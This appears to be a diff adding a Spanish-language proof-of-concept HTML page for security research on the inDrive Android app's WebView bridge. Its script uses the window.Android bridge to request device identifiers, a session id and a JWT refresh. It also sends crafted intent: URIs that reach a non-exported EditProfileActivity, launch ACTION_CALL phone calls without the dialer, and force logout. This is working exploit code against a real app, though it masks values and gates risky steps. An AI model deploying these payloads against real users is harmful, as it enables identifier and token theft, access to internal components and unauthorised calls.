@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>inDrive bridge - rerun consolidado</title>
+<style>
+  :root { color-scheme: dark; }
+  * { box-sizing: border-box; }
+  body { margin:0; padding:14px 14px 40px; font-family: ui-monospace, Menlo, Consolas, monospace; background:#0b0f14; color:#d7e2ea; }
+  h1 { font-size:17px; margin:0 0 6px; color:#fff; }
+  h2 { font-size:13px; text-transform:uppercase; letter-spacing:.08em; color:#7fb3d5; margin:22px 0 8px; }
+  p, li { font-size:12.5px; line-height:1.45; color:#9fb0bd; }
+  code { color:#ffd479; word-break:break-all; }
+  .badge { display:inline-block; padding:3px 8px; border-radius:999px; font-size:11px; font-weight:700; }
+  .ok { background:#123d24; color:#5ee08a; }
+  .bad { background:#3d1212; color:#ff7b7b; }
+  .card { background:#111821; border:1px solid #1e2a36; border-radius:10px; padding:12px; margin:10px 0; }
+  .test { background:#111821; border:1px solid #1e2a36; border-radius:10px; padding:10px; margin:10px 0; }
+  .test .name { font-size:12.5px; color:#d7e2ea; margin-bottom:2px; }
+  .test .exp { font-size:11px; color:#6b7c8a; margin-bottom:8px; }
+  button { width:100%; padding:12px; margin:4px 0; font-size:14px; font-weight:600; border-radius:9px; border:1px solid #2a3a4a; background:#17222d; color:#e8eef3; }
+  button:active { transform:translateY(1px); }
+  button.safe { border-color:#1f5a37; background:#102a1c; color:#8ff0b0; }
+  button.sens { border-color:#6b4b12; background:#2a2010; color:#ffd479; }
+  button.danger { border-color:#6b1f1f; background:#2a1010; color:#ff9a9a; }
+  select, input { width:100%; padding:10px; margin:4px 0; border-radius:8px; border:1px solid #2a3a4a; background:#0e151c; color:#e8eef3; font-family:inherit; font-size:13px; }
+  #log { background:#05080b; border:1px solid #1e2a36; border-radius:10px; padding:10px; margin-top:10px; min-height:180px; white-space:pre-wrap; word-break:break-all; font-size:11.5px; line-height:1.4; }
+  .muted { color:#6b7c8a; font-size:11.5px; }
+  .row { display:flex; gap:8px; }
+  .row > * { flex:1; }
+  a { color:#7fb3d5; }
+  .dangerbox { border-color:#6b1f1f; }
+</style>
+</head>
+<body>
+
+<h1>inDrive WebView &mdash; rerun consolidado</h1>
+<p>Una sola p&aacute;gina para repetir todo de cero. Cada prueba tiene un selector: marca <strong>funcion&oacute;</strong>, <strong>no hizo nada</strong>, <strong>pidi&oacute; confirmaci&oacute;n</strong> o <strong>abri&oacute; otra cosa</strong>. Al final pulsa <strong>Copiar informe</strong> y p&eacute;galo aqu&iacute;.</p>
+
+<div class="card">
+  <div>Bridge: <span id="stBridge" class="badge bad">no</span></div>
+  <div style="margin-top:6px">URL: <code id="stUrl"></code></div>
+  <div style="margin-top:6px">App: <code id="stApp">-</code> &middot; Modelo: <code id="stModel">-</code> &middot; Android: <code id="stOs">-</code></div>
+  <div style="margin-top:6px">M&eacute;todos: <code id="stMethods">-</code></div>
+</div>
+
+<h2>1. Identificadores (enmascarados)</h2>
+
+<div class="test">
+  <div class="name">get_hard_id</div>
+  <div class="exp">Esperado: success=true con un id de 18 caracteres.</div>
+  <button class="sens" onclick="tHardId()">Ejecutar get_hard_id</button>
+  <select data-test="get_hard_id" id="res_hard_id"><option value="">sin probar</option><option>funciono</option><option>no hizo nada</option><option>pidio confirmacion</option><option>abrio otra cosa</option><option>error</option></select>
+</div>
+
+<div class="test">
+  <div class="name">get_shield_session_id</div>
+  <div class="exp">Esperado: success=true con valor que empieza por v1_.</div>
+  <button class="sens" onclick="tShield()">Ejecutar get_shield_session_id</button>
+  <select data-test="get_shield_session_id" id="res_shield"><option value="">sin probar</option><option>funciono</option><option>no hizo nada</option><option>pidio confirmacion</option><option>abrio otra cosa</option><option>error</option></select>
+</div>
+
+<div class="test">
+  <div class="name">get_marketing_referral_link</div>
+  <div class="exp">En 5.166.1 respondi&oacute; success=false.</div>
+  <button class="safe" onclick="tReferral()">Ejecutar get_marketing_referral_link</button>
+  <select data-test="get_marketing_referral_link" id="res_referral"><option value="">sin probar</option><option>funciono</option><option>no hizo nada</option><option>success=false</option><option>error</option></select>
+</div>
+
+<div class="test">
+  <div class="name">refresh_jwt</div>
+  <div class="exp">En la prueba anterior no hubo respuesta (allowlist activa). No se muestra el token.</div>
+  <button class="danger" onclick="tRefresh()">Ejecutar refresh_jwt</button>
+  <select data-test="refresh_jwt" id="res_jwt"><option value="">sin probar</option><option>respondio con token</option><option>no respondio</option><option>respondio success=false</option><option>error</option></select>
+</div>
+
+<h2>2. UI (control positivo)</h2>
+
+<div class="test">
+  <div class="name">toast</div>
+  <div class="exp">Esperado: toast nativo visible.</div>
+  <button class="safe" onclick="tToast()">Mostrar toast</button>
+  <select data-test="toast" id="res_toast"><option value="">sin probar</option><option>funciono</option><option>no hizo nada</option><option>error</option></select>
+</div>
+
+<h2>3. Intent redirection</h2>
+
+<div class="test">
+  <div class="name">open_browser_tab &rarr; URL https</div>
+  <div class="exp">Esperado: se abre Chrome en example.com.</div>
+  <button class="safe" onclick="tHttps()">Abrir https://example.com</button>
+  <select data-test="open_https" id="res_https"><option value="">sin probar</option><option>funciono</option><option>no hizo nada</option><option>abrio otra cosa</option><option>error</option></select>
+</div>
+
+<div class="test">
+  <div class="name">intent Settings (can&oacute;nico)</div>
+  <div class="exp">Esperado: se abren los Ajustes de Android.</div>
+  <button class="safe" onclick="tSettings()">Abrir Ajustes</button>
+  <select data-test="settings" id="res_settings"><option value="">sin probar</option><option>funciono</option><option>no hizo nada</option><option>error</option></select>
+</div>
+
+<div class="test">
+  <div class="name">location.href &rarr; intent Settings</div>
+  <div class="exp">Esperado: tambi&eacute;n abre Ajustes (segunda ruta, sin bridge).</div>
+  <button class="safe" onclick="tSettingsNav()">Navegar a intent Settings</button>
+  <select data-test="settings_nav" id="res_settings_nav"><option value="">sin probar</option><option>funciono</option><option>no hizo nada</option><option>error</option></select>
+</div>
+
+<div class="test">
+  <div class="name">Componente NO exportado: EditProfileActivity</div>
+  <div class="exp">Esperado: pantalla de editar perfil / c&aacute;mara. Prueba que se alcanzan componentes internos con el UID de inDrive.</div>
+  <button class="sens" onclick="tEditProfile()">Abrir EditProfileActivity</button>
+  <select data-test="edit_profile" id="res_edit"><option value="">sin probar</option><option>funciono</option><option>no hizo nada</option><option>error</option></select>
+</div>
+
+<h2>4. Tel&eacute;fono (URI corregido con scheme=tel)</h2>
+
+<div class="test">
+  <div class="name">ACTION_DIAL (no llama)</div>
+  <div class="exp">Esperado: se abre el marcador con 123456 (no marca).</div>
+  <button class="safe" onclick="tDial()">Abrir marcador</button>
+  <select data-test="dial" id="res_dial"><option value="">sin probar</option><option>funciono</option><option>no hizo nada</option><option>abrio otra cosa</option><option>error</option></select>
+</div>
+
+<div class="test dangerbox">
+  <div class="name">ACTION_CALL (llamada real)</div>
+  <div class="exp">Escribe un n&uacute;mero tuyo. Si funciona, la llamada inicia sin pasar por el marcador. Canc&eacute;lala al aparecer.</div>
+  <input id="phone" placeholder="numero propio (no se guarda)" spellcheck="false">
+  <label class="muted"><input type="checkbox" id="armCall" style="width:auto"> Habilitar bot&oacute;n de llamada</label>
+  <button class="danger" onclick="tCall()">ACTION_CALL v&iacute;a open_browser_tab</button>
+  <button class="danger" onclick="tCallNav()">ACTION_CALL v&iacute;a location.href</button>
+  <select data-test="call" id="res_call"><option value="">sin probar</option><option>llamo sin confirmacion</option><option>pidio confirmacion del sistema</option><option>no hizo nada</option><option>error</option></select>
+</div>
+
+<h2>5. Opcionales (riesgo)</h2>
+
+<div class="test dangerbox">
+  <div class="name">logout_with_message</div>
+  <div class="exp">Cierra la sesi&oacute;n y muestra un mensaje. Solo si aceptas volver a iniciar sesi&oacute;n.</div>
+  <button class="danger" onclick="tLogout()">Cerrar sesi&oacute;n de prueba</button>
+  <select data-test="logout" id="res_logout"><option value="">sin probar</option><option>funciono</option><option>no hizo nada</option><option>error</option></select>
+</div>
+
+<h2>Informe</h2>
+<div id="log">Esperando...</div>
+<div class="row" style="margin-top:8px">
+  <button class="safe" onclick="copyReport()">Copiar informe</button>
+  <button class="safe" onclick="clearLog()">Limpiar log</button>
+  <button class="danger" onclick="resetAll()">Reiniciar todo</button>
+</div>
+
+<script>
+var LOG = [];
+var bridge = null;
+var SAVE_KEY = "indrive_rerun_v1";
+
+function now() { return new Date().toISOString().slice(11, 23); }
+function saveState() {
+  try {
+    var results = {};
+    document.querySelectorAll("select[data-test]").forEach(function (s) { results[s.getAttribute("data-test")] = s.value; });
+    localStorage.setItem(SAVE_KEY, JSON.stringify({ log: LOG, results: results }));
+  } catch (e) {}
+}
+function restoreState() {
+  try {
+    var raw = localStorage.getItem(SAVE_KEY);
+    if (!raw) return;
+    var st = JSON.parse(raw);
+    if (st.log && st.log.length) LOG = st.log;
+    if (st.results) {
+      document.querySelectorAll("select[data-test]").forEach(function (s) {
+        var v = st.results[s.getAttribute("data-test")];
+        if (v) s.value = v;
+      });
+    }
+    if (LOG.length) {
+      document.getElementById("log").textContent = LOG.join("\n");
+      LOG.push("[restaurado] estado anterior recuperado");
+    }
+  } catch (e) {}
+}
+function resetAll() {
+  try { localStorage.removeItem(SAVE_KEY); } catch (e) {}
+  location.reload();
+}
+function log(m) {
+  LOG.push("[" + now() + "] " + m);
+  var el = document.getElementById("log");
+  el.textContent = LOG.join("\n");
+  el.scrollTop = el.scrollHeight;
+  saveState();
+}
+function mask(v) {
+  var s = String(v == null ? "" : v);
+  if (s.length <= 8) return s;
+  return s.slice(0, 4) + "..." + s.slice(-4) + " (" + s.length + ")";
+}
+function send(action, data, note) {
+  if (!bridge) { log("SIN BRIDGE: " + action); return; }
+  var msg = JSON.stringify({ action: action, data: data || {} });
+  log("TX " + (note || action) + " :: " + msg);
+  try { bridge.postMessage(msg); }
+  catch (e) { log("postMessage error: " + e.message); }
+}
+
+function probe() {
+  bridge = (window.Android && typeof window.Android.postMessage === "function") ? window.Android : null;
+  var b = document.getElementById("stBridge");
+  b.textContent = bridge ? "presente" : "ausente";
+  b.className = "badge " + (bridge ? "ok" : "bad");
+  document.getElementById("stUrl").textContent = location.href;
+  if (bridge) {
+    var keys = [];
+    for (var k in window.Android) { if (typeof window.Android[k] === "function") keys.push(k); }
+    document.getElementById("stMethods").textContent = keys.join(", ");
+    try { document.getElementById("stApp").textContent = window.Android.getAppVersion(); } catch (e) {}
+    try { document.getElementById("stModel").textContent = window.Android.getDeviceModel(); } catch (e) {}
+    try { document.getElementById("stOs").textContent = window.Android.getOsVersion(); } catch (e) {}
+    log("bridge Android presente; metodos: " + keys.join(","));
+  } else {
+    log("window.Android ausente: abre esta pagina con indrive://webdialog?url=...");
+  }
+}
+
+document.addEventListener("message", function (ev) {
+  log("RX " + String(ev.data).slice(0, 500));
+});
+
+function tHardId() { send("get_hard_id", {}, "get_hard_id"); }
+function tShield() { send("get_shield_session_id", {}, "get_shield_session_id"); }
+function tReferral() { send("get_marketing_referral_link", {}, "get_marketing_referral_link"); }
+function tRefresh() { send("refresh_jwt", {}, "refresh_jwt"); }
+function tToast() { send("toast", { text: "rerun " + now() }, "toast"); }
+function tHttps() { send("open_browser_tab", { url: "https://example.com/?indrive_rerun=https" }, "open_browser_tab https"); }
+function tSettings() { send("open_browser_tab", { url: "intent:#Intent;action=android.settings.SETTINGS;end" }, "intent Settings"); }
+function tSettingsNav() {
+  var u = "intent:#Intent;action=android.settings.SETTINGS;end";
+  log("location.href -> " + u);
+  try { location.href = u; } catch (e) { log("nav error: " + e.message); }
+}
+function tEditProfile() {
+  var u = "intent:#Intent;component=sinet.startup.inDriver/sinet.startup.inDriver.trust_n_safety.profile.ui.EditProfileActivity;B.ARG_SKIP_ONBOARDING=true;S.ARG_ENTRY_POINT=poc;end";
+  send("open_browser_tab", { url: u }, "EditProfileActivity no exportada");
+}
+function tDial() {
+  send("open_browser_tab", { url: "intent:123456#Intent;action=android.intent.action.DIAL;scheme=tel;end" }, "DIAL 123456");
+}
+function phone() {
+  return document.getElementById("phone").value.trim().replace(/[^0-9+]/g, "");
+}
+function tCall() {
+  if (!document.getElementById("armCall").checked) { log("marca 'Habilitar boton de llamada'"); return; }
+  var n = phone(); if (!n) { log("falta numero"); return; }
+  send("open_browser_tab", { url: "intent:" + n + "#Intent;action=android.intent.action.CALL;scheme=tel;end" }, "CALL bridge");
+}
+function tCallNav() {
+  if (!document.getElementById("armCall").checked) { log("marca 'Habilitar boton de llamada'"); return; }
+  var n = phone(); if (!n) { log("falta numero"); return; }
+  var u = "intent:" + n + "#Intent;action=android.intent.action.CALL;scheme=tel;end";
+  log("location.href -> " + u);
+  try { location.href = u; } catch (e) { log("nav error: " + e.message); }
+}
+function tLogout() {
+  if (!confirm("Esto cierra tu sesion. Continuar?")) return;
+  send("logout_with_message", { message: "rerun PoC" }, "logout_with_message");
+}
+
+function copyReport() {
+  var out = ["=== inDrive rerun ===", "app=" + document.getElementById("stApp").textContent + " os=" + document.getElementById("stOs").textContent + " model=" + document.getElementById("stModel").textContent, "url=" + document.getElementById("stUrl").textContent, "bridge=" + document.getElementById("stBridge").textContent, ""];
+  var sels = document.querySelectorAll("select[data-test]");
+  for (var i = 0; i < sels.length; i++) {
+    out.push(sels[i].getAttribute("data-test") + " => " + (sels[i].value || "sin probar"));
+  }
+  out.push("", "--- log ---");
+  out = out.concat(LOG);
+  var txt = out.join("\n");
+  if (navigator.clipboard && navigator.clipboard.writeText) {
+    navigator.clipboard.writeText(txt).then(function(){ log("informe copiado al portapapeles"); }, function(){ fallbackCopy(txt); });
+  } else { fallbackCopy(txt); }
+}
+function fallbackCopy(txt) {
+  var ta = document.createElement("textarea");
+  ta.value = txt; document.body.appendChild(ta); ta.select();
+  try { document.execCommand("copy"); log("informe copiado (fallback)"); } catch (e) { log("no se pudo copiar"); }
+  document.body.removeChild(ta);
+}
+function clearLog() { LOG = []; document.getElementById("log").textContent = "Esperando..."; saveState(); }
+
+document.querySelectorAll("select[data-test]").forEach(function (s) { s.addEventListener("change", saveState); });
+restoreState();
+probe();
+</script>
+</body>
+</html>
